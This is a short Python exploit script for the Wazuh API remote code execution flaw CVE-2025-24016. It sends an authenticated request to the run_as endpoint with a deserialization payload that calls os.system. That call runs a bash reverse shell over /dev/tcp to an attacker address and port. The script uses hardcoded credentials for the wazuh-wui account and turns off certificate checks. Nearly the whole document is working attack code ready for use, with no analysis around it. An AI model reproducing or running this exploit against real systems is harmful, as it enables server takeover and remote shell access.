import requests
import urllib3
import base64

### Wazuh CVE-2025-24016 Exploit Script
# This script exploits the Wazuh RCE vulnerability (CVE-2025-24016) 

# ------------------------- Configuration -------------------------
target_host = "192.168.8.138"
target_port = 55000

attacker_ip = "192.168.8.136"
attacker_port = 4444
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = f"https://{target_host}:{target_port}/security/user/authenticate/run_as"

# ------------------------- Authentication -------------------------
username = "wazuh-wui"
password = "Xs6nvWB74eDTKwqjP7WE.MABl3?Y3w.q"

credentials = f"{username}:{password}"
auth = str(base64.b64encode(credentials.encode()).decode())

# ------------------------- Payload Execution -------------------------
headers = {
    "Host": f"{target_host}:{target_port}",
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Authorization": f"Basic {auth}",
    "Content-Type": "application/json"
}

# Payload to execute a reverse shell
payload = {
    "__unhandled_exc__": {
        "__class__": "os.system",
        "__args__": [
            f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1; exit 0'"
        ]
    }
}

# Sending the request to execute the payload
try:
    response = requests.post(url, json=payload, headers=headers, verify=False)
    print("Status Code:", response.status_code)
    print("Response Body:\n", response.text)
except Exception as e:
    print("Error:", e)
